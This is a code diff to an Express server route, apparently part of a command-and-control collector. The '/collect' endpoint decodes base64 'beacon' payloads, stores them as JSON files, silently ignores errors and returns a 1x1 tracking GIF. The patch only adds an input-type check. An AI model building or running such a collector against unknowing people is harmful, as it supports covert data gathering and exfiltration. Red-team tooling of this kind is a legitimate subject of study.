@@ -164,36 +164,41 @@ app.post('/collect', collectLimiter, async (req, res) => {
 // ──────────────────────────────────────────────────
 app.get('/collect', collectLimiter, async (req, res) => {
   if (req.query.d) {
-    // Basic size validation for base64 payload (10KB limit)
-    if (req.query.d.length > 10240) {
-      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${req.query.d.length} bytes)`)
+    // Ensure the beacon payload is a string to avoid type confusion
+    if (typeof req.query.d !== 'string') {
+      console.warn('[C2] ⚠️  Invalid type for beacon payload, expected string')
     } else {
-      try {
-        await ensureDataDir()
-        const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
-
-        // Ensure decoded data is valid JSON
-        let parsed;
+      // Basic size validation for base64 payload (10KB limit)
+      if (req.query.d.length > 10240) {
+        console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${req.query.d.length} bytes)`)
+      } else {
         try {
-          parsed = JSON.parse(decoded)
-        } catch (je) {
-          console.warn('[C2] ⚠️  Invalid JSON in beacon payload')
-        }
+          await ensureDataDir()
+          const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
 
-        if (parsed) {
-          // Sanitize decoded data before writing to disk
-          const sanitizedData = sanitizeBody(parsed)
-          const record = {
-            id: `beacon-${Date.now()}`,
-            timestamp: new Date().toISOString(),
-            data: sanitizedData
+          // Ensure decoded data is valid JSON
+          let parsed;
+          try {
+            parsed = JSON.parse(decoded)
+          } catch (je) {
+            console.warn('[C2] ⚠️  Invalid JSON in beacon payload')
           }
-          await fs.writeFile(
-            path.join(DATA_DIR, `${record.id}.json`),
-            JSON.stringify(record, null, 2)
-          )
-        }
-      } catch (e) { /* silent */ }
+
+          if (parsed) {
+            // Sanitize decoded data before writing to disk
+            const sanitizedData = sanitizeBody(parsed)
+            const record = {
+              id: `beacon-${Date.now()}`,
+              timestamp: new Date().toISOString(),
+              data: sanitizedData
+            }
+            await fs.writeFile(
+              path.join(DATA_DIR, `${record.id}.json`),
+              JSON.stringify(record, null, 2)
+            )
+          }
+        } catch (e) { /* silent */ }
+      }
     }
   }
   // Return 1x1 transparent GIF
